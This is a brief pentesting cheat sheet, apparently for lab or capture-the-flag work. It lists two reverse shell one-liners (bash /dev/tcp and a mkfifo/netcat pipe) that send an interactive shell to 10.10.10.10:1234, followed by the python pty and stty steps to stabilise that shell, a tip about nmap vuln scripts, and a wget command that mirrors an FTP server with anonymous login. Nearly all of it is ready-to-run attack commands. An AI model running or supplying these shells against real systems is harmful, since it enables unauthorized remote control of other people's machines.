# Initial 
Get a revshell 
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```
to have a good tty
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo;fg
[Enter]
[Enter]

```
Then whe get those values
```bash
echo $TERM
stty size
```
and we put them into the terminal

```bash
export TERM=xterm-256color
stty rows XX columns XX
```

# Nmap
When using nmap use the vuln script could be useful sometimes 
# Common services
## FTP
download all the FTP directories

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```